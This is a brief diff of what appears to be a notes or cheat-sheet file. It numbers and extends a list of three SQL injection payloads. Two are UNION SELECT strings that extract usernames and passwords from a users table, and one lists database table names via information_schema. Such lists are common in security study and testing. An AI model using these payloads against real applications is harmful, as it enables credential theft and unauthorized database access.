@@ -98,9 +98,9 @@
 
 eg :-)
 
-' union select username, password from users--+
-'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-
+1. ' union select username, password from users--+
+2. '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+3. '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 
 
 
